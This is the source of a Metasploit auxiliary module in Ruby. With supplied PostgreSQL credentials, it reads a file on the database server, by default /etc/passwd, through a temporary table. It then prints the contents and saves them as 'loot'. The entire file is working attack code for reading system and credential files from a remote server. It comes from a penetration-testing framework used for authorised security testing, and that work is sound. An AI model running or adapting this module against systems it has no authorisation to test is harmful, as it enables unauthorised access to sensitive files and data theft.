##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'


class Metasploit3 < Msf::Auxiliary

	include Msf::Exploit::Remote::Postgres
	include Msf::Auxiliary::Report

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'PostgreSQL Server Generic Query',
			'Description'    => %q{
					This module imports a file local on the PostgreSQL Server into a
					temporary table, reads it, and then drops the temporary table.
					It requires PostgreSQL credentials with table CREATE privileges
					as well as read privileges to the target file.
			},
			'Author'         => [ 'todb' ],
			'License'        => MSF_LICENSE,
			'References'     =>
				[
					[ 'URL', 'http://michaeldaw.org/sql-injection-cheat-sheet#postgres' ]
				]
		))

		register_options(
			[
				OptString.new('RFILE', [ true, 'The remote file', '/etc/passwd'])
			], self.class)

		deregister_options( 'SQL', 'RETURN_ROWSET' )
	end

	def rhost
		datastore['RHOST']
	end

	def rport
		datastore['RPORT']
	end

	def run
		ret = postgres_read_textfile(datastore['RFILE'])
		case ret.keys[0]
		when :conn_error
			print_error "#{rhost}:#{rport} Postgres - Authentication failure, could not connect."
		when :sql_error
			case ret[:sql_error]
			when /^C58P01/
				print_error "#{rhost}:#{rport} Postgres - No such file or directory."
				vprint_status "#{rhost}:#{rport} Postgres - #{ret[:sql_error]}"
			when /^C42501/
				print_error "#{rhost}:#{rport} Postgres - Insufficent file permissions."
				vprint_status "#{rhost}:#{rport} Postgres - #{ret[:sql_error]}"
			else
				print_error "#{rhost}:#{rport} Postgres - #{ret[:sql_error]}"
			end
		when :complete
			loot = ''
			ret[:complete].rows.each { |row|
				print_line(row.first)
				loot << row.first
			}
			# No idea what the actual ctype will be, text/plain is just a guess
			path = store_loot('postgres.file', 'text/plain', rhost, loot, datastore['RFILE'])
			print_status("#{rhost}:#{rport} Postgres - #{datastore['RFILE']} saved in #{path}")
			vprint_good  "#{rhost}:#{rport} Postgres - Command complete."
		end
		postgres_logout if self.postgres_conn
	end
end
